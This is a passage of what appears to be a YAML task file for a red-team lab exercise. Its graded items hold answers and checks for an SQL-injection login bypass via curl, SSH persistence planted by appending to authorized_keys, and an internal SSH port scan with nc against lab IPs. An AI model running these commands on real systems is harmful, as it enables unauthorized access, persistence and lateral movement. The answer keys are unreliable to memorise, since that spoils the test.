  script: 'curl -s -o /dev/null -w ''code=%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"admin\" OR 1=1--","password":"x"}'''
  risk_level: low
  bastion_prompt: ''
- order: 5
  instruction: R5 지속성 시뮬 — authorized_keys 추가.
  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
  category: analysis
  points: 13
  answer: mkdir -p ~/.ssh && echo '# r5 persistence $(date +%s)' >> ~/.ssh/authorized_keys
    && ls -la ~/.ssh/authorized_keys
  answer_detail: 지속성 심기. auditd로 추적 가능해야.
  verify:
    type: output_contains
    expect: authorized_keys
    field: stdout
    semantic:
      intent: '[R5 Persistence] — mkdir -p ~/.ssh + echo ''# r5 persistence'' >> authorized_keys
        + ls. auditd 추적. T1098.004.'
      success_criteria:
      - authorized_keys 파일
      - append + ls
      - persistence
      acceptable_methods:
      - echo append
      - tee -a
      - ssh-copy-id
      negative_signs:
      - append 없음
      - ls 누락
      - persistence 맥락 없음
  target_vm: web
  script: mkdir -p ~/.ssh && echo '# r5 persistence $(date +%s)' >> ~/.ssh/authorized_keys
    && ls -la ~/.ssh/authorized_keys
  risk_level: low
  bastion_prompt: ''
- order: 6
  instruction: R3 측면이동 시도.
  hint: target_vm=web에서 수행. 아래 CLI 예시 참고.
  category: pivot
  points: 14
  answer: for dst in 1 100 201; do timeout 2 nc -zv 10.20.30.$dst 22 2>&1 | head -1
    || echo 'port22_closed_or_filtered'; done
  answer_detail: R3 내부 스캔. 3호스트 22포트 시도.
  verify:
    type: output_contains
    expect: '22'
    field: stdout
    semantic:
      intent: '[R3 측면이동] 내부 SSH 스캔 — for dst in 1 100 201; timeout 2 nc -zv 10.20.30.$dst
        22. 3호스트 22포트 시도. T1021.004.'
      success_criteria:
      - 22 포트
      - 3 호스트 순회
      - nc -zv + timeout
      acceptable_methods:
      - nc -zv
      - nmap -p 22
      - masscan
      negative_signs:
      - 호스트 1-2개
      - timeout 없음
      - 포트 22 외 다른
  target_vm: web
  script: for dst in 1 100 201; do timeout 2 nc -zv 10.20.30.$dst 22 2>&1 | head -1
    || echo 'port22_closed_or_filtered'; done
  risk_level: low
  bastion_prompt: ''
- order: 7
